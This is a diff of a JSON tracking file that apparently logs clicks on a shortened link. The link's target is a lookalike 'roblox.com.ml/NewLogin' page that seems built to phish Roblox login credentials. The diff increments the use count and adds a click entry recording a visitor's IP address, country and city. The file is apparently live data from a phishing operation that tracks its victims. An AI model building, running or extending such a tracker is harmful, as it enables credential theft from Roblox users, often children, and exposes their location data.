@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 572,
+    "useCount": 573,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4683,6 +4683,14 @@
       },
       {
         "timestamp": 1777103921743,
+        "ip": "79.249.78.87",
+        "country": "Germany",
+        "city": "Menden",
+        "flag": "🇩🇪",
+        "countryCode": "DE"
+      },
+      {
+        "timestamp": 1777103941310,
         "ip": "79.249.78.87",
         "country": "Germany",
         "city": "Menden",
